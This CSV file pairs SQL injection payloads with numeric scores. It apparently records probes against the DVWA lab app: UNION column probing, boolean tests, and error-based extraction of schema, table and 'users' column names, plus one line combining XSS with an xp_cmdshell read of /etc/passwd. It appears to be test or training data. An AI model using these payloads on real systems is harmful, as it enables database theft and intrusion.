payload,score
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#""]",4262
"[""-4300' UNION ALL SELECT 1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1382,1""]",4174
"[""-7233' UNION ALL SELECT 1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1671,1""]",4174
"[""-6447' UNION ALL SELECT 5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5165,5""]",4174
"[""-1376' UNION ALL SELECT 7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7800,7""]",4174
"[""-9387' UNION ALL SELECT 1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1211,1""]",4174
"[""-4674' UNION ALL SELECT 3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3198,3""]",4174
"[""-4848' UNION ALL SELECT 8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8029,8""]",4174
"[""-3394' UNION ALL SELECT 5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5559,5""]",4174
"[""-5655' UNION ALL SELECT 4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4549,4""]",4174
"[""-3605' UNION ALL SELECT 1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1010,1""]",4174
"[""-1949' UNION ALL SELECT 7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7996,7""]",4174
"[""-9430' UNION ALL SELECT 4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4185,4""]",4174
"[""-1752' UNION ALL SELECT 6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6127,6""]",4174
"[""-5804' UNION ALL SELECT 9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9188,9""]",4174
"[""-4365' UNION ALL SELECT 9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9054,9""]",4174
"[""-2645' UNION ALL SELECT 5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5282,5""]",4174
"[""-3025' UNION ALL SELECT 5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5310,5""]",4174
"[""-2919' UNION ALL SELECT 3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3""]",4174
"[""-5597' UNION ALL SELECT 4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4981,4""]",4174
"[""-7923' UNION ALL SELECT 1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1881,1""]",4174
"[""1' AND (SELECT 5875 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT (CASE WHEN (3881=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                3881) THEN 1 ELSE 0 END)),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IKvm""]",4273
"[""1' AND (SELECT 8635 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT REPEAT(0x34,1024)),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DPTO""]",4291
"[""1' AND (SELECT 4895 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT REPEAT(0x32,512)),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KHBY""]",4291
"[""1' AND (SELECT 4928 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT REPEAT(0x36,256)),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- HAgo""]",4221
"[""1' AND (SELECT 8431 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT REPEAT(0x34,54)),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- HeQB""]",4221
"[""1' AND (SELECT 5371 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(MID((IFNULL(CAST(DATABASE() AS CHAR),0x20)),1,54)),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NeIS""]",4270
"[""1' AND (SELECT 1345 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761)),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- xhiO""]",4273
"[""1' AND (SELECT 1380 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761) LIMIT 0,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mnRL""]",4265
"[""1' AND (SELECT 1857 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761) LIMIT 1,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CefW""]",4269
"[""1' AND (SELECT 5893 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IiSh""]",4273
"[""1' AND (SELECT 6258 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 0,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DpfK""]",4267
"[""1' AND (SELECT 3370 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_type AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 0,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Mrxy""]",4268
"[""1' AND (SELECT 3454 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 1,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ozLE""]",4264
"[""1' AND (SELECT 4099 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_type AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 1,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- QGDD""]",4263
"[""1' AND (SELECT 2215 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 2,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DRsA""]",4265
"[""1' AND (SELECT 5413 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_type AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 2,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sRkK""]",4263
"[""1' AND (SELECT 9763 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 3,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ZMrM""]",4270
"[""1' AND (SELECT 8385 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_type AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 3,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- hCSD""]",4263
"[""1' AND (SELECT 2086 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 4,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ibNf""]",4266
"[""1' AND (SELECT 3791 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_type AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 4,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- WhUM""]",4263
"[""1' AND (SELECT 9272 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 5,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- EbwA""]",4268
"[""1' AND (SELECT 2841 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_type AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 5,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CHjD""]",4263
"[""1' AND (SELECT 2419 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- gfjb""]",4273
"[""1' AND (SELECT 5207 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761 LIMIT 0,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nDxB""]",4264
"[""1' AND (SELECT 6698 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_type AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761 LIMIT 0,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- AKab""]",4254
"[""1' AND (SELECT 8153 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761 LIMIT 1,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Cctk""]",4267
"[""1' AND (SELECT 9824 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_type AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761 LIMIT 1,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- OYVb""]",4262
"[""1' AND (SELECT 8090 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761 LIMIT 2,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- MCha""]",4270
"[""1' AND (SELECT 1367 FROM(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT MID((IFNULL(CAST(column_type AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761 LIMIT 2,1),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zffb""]",4262
"['3768 AND 1=1 UNION ALL SELECT 1,NULL,\'<script>alert(""XSS"")</script>\',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell(\'cat ../../../etc/passwd\')#']",4089
['2388'],0
"['1(((.,,,\'.""']",4172
"['1\'hjmfNB<\'"">uOGIOL']",4152
['1) AND 2591=2808 AND (8052=8052'],89
['1) AND 1476=1476 AND (9962=9962'],89
['1 AND 2413=5941'],73
['1 AND 1476=1476'],73
['1 AND 4596=2770-- ICvB'],80
['1 AND 1476=1476-- ZFLy'],80
"[""1') AND 7111=3031 AND ('obpn'='obpn""]",4141
"[""1') AND 1476=1476 AND ('lgAb'='lgAb""]",4141
"[""1' AND 9497=7471 AND 'Gjur'='Gjur""]",0
"[""1' AND 1476=1476 AND 'xYdz'='xYdz""]",91
"[""1' AND 1139=9159 AND 'IYSC'='IYSC""]",0
['(SELECT (CASE WHEN (9772=3583) THEN 1 ELSE (SELECT 3583 UNION SELECT 4125) END))'],0
['(SELECT (CASE WHEN (8383=8383) THEN 1 ELSE (SELECT 3444 UNION SELECT 4159) END))'],0
['1) AND 3753=4733#'],75
['1) AND 3709=3709#'],75
['1)) AND 9681=1978#'],76
['1)) AND 3709=3709#'],76
['1))) AND 2467=1219#'],77
['1))) AND 3709=3709#'],77
['1 AND 2458=3430#'],74
['1 AND 3709=3709#'],74
['1)) AS tQpr WHERE 6816=6816 AND 9901=4744#'],100
['1)) AS hSDq WHERE 2969=2969 AND 3709=3709#'],100
['1) AS fbAP WHERE 5420=5420 AND 1725=9866#'],99
['1) AS hizM WHERE 6320=6320 AND 3709=3709#'],99
['1` WHERE 6322=6322 AND 2802=3315#'],91
['1` WHERE 1690=1690 AND 3709=3709#'],91
['1`) WHERE 4919=4919 AND 8686=8702#'],92
['1`) WHERE 8596=8596 AND 3709=3709#'],92
"[""1') AND 5072=7989#""]",4158
"[""1') AND 3709=3709#""]",4158
"[""1' AND 6229=6657#""]",0
"[""1' AND 3709=3709#""]",75
"[""1' AND 9628=2137#""]",0
"['1"" AND 6909=6020#']",75
"['1"" AND 3709=3709#']",75
"[""1')) AND 4576=9132#""]",4157
"[""1')) AND 3709=3709#""]",4157
"[""1'))) AND 9508=4765#""]",4156
"[""1'))) AND 3709=3709#""]",4156
"['1"") AND 6370=6604#']",76
"['1"") AND 3709=3709#']",76
"['1"")) AND 1109=4979#']",77
"['1"")) AND 3709=3709#']",77
"['1""))) AND 3499=3522#']",78
"['1""))) AND 3709=3709#']",78
"[""1')) AS ZJSE WHERE 1188=1188 AND 1389=2821#""]",4133
"[""1')) AS Oadd WHERE 5990=5990 AND 3709=3709#""]",4133
"['1"")) AS sqLN WHERE 4688=4688 AND 1369=6758#']",101
